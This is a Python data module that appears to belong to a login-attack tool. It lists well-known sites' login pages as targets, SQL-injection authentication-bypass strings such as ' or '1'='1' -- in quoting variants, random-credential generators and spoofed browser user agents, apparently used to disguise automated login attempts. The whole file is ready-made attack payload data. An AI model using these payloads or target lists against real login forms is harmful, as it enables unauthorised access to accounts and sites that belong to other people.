#https://github.com/rapid7/metasploit-framework/tree/master/data/wordlists
def sqli_user():
	from logidoor.data.gensqli import sPayload
	return sPayload()

def sqli_pass():
	from logidoor.libs.cores import string_gen_randomly
	return string_gen_randomly(len_min = 5, len_max = 12)

def social_urls():
	# https://accounts.google.com/signin
	# https://mega.nz/login
	# https://mail.protonmail.com/login
	# https://www.mediafire.com/login/
	return """https://www.facebook.com/login.php
	https://mobile.twitter.com/login
	https://ask.fm/login
	https://www.linkedin.com/uas/login
	https://github.com/login
	https://www.virustotal.com/en/account/signin/
	https://signin.ebay.com/ws/eBayISAPI.dll
	https://en.wikipedia.org/w/index.php?title=Special:UserLogin
	https://stackoverflow.com/users/login
	https://foursquare.com/login
	https://gitlab.com/users/sign_in
	https://www.airdroid.com/en/signin/
	https://login.yahoo.com"""


	
def getSQL():
	return """ or true --
	 or '1'='1' --
	 or '1'='1 --
	' or true --
	' or '1'='1' --
	' or '1'='1 --
	" or true --
	" or '1'='1' --
	" or '1'='1 --
	') or true --
	') or '1'='1' --
	') or '1'='1 --
	") or true --
	") or '1'='1' --
	") or '1'='1 --
	')) or true --
	')) or '1'='1' --
	')) or '1'='1 --
	")) or true --
	")) or '1'='1' --
	")) or '1'='1 --""".replace("\t", "")
	
def getAgent():
	return """Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6
	Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)
	Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.5) Gecko/20060127 Netscape/8.1
	Mozilla/5.0 (iPad; U; CPU OS 3_2_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B500 Safari/531.21.10
	Mozilla/5.0 (iPad; CPU OS 6_1_3 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10B329 Safari/8536.25
	Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko
	Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
	Mozilla/5.0 (Linux; U; Android 2.2.1; en-ca; LG-P505R Build/FRG83) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1
	Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124""".replace("\t", "")